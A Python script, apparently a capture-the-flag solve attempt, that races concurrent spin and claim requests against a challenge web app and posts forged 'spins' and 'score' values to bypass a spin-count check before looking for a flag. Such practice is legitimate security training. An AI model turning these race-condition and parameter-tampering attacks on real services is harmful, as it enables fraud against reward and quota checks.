import requests, threading, time, random, string

base = 'https://web-random-cheese.tracebash.xyz'

# Create fresh user
s = requests.Session()
name = ''.join(random.choices(string.ascii_lowercase, k=8))
s.post(f'{base}/register', data={'username': name, 'password': name})
s.post(f'{base}/login', data={'username': name, 'password': name})

# Race: send spin + claim simultaneously to bypass spin count check
success = [False]

def do_spin():
    for i in range(5):
        r = s.post(f'{base}/spin')
        if success[0]: return

def do_claim():
    time.sleep(0.01)
    r = s.post(f'{base}/claim', data={})
    print('Claim response:', r.status_code, r.text[:300].encode('ascii', errors='replace').decode('ascii'))
    if 'Congratulations' in r.text or 'CTF' in r.text or 'flag' in r.text.lower():
        print('FLAG FOUND!', r.text)
        success[0] = True

t = threading.Thread(target=do_spin)
t2 = threading.Thread(target=do_claim)
t.start()
t2.start()
t.join()
t2.join()

# Also try to see if we can just skip checking by providing spins=10
s2 = requests.Session()
s2.post(f'{base}/register', data={'username': 'race99', 'password': 'race99'})
s2.post(f'{base}/login', data={'username': 'race99', 'password': 'race99'})
r = s2.post(f'{base}/claim', data={'spins': '10', 'score': '100'})
print('\nClaim with data:', r.status_code, r.text[:300].encode('ascii', errors='replace').decode('ascii'))

# Try JSON
r = s2.post(f'{base}/claim', json={'spins': 10, 'score': 100})
print('Claim with json:', r.status_code, r.text[:300].encode('ascii', errors='replace').decode('ascii'))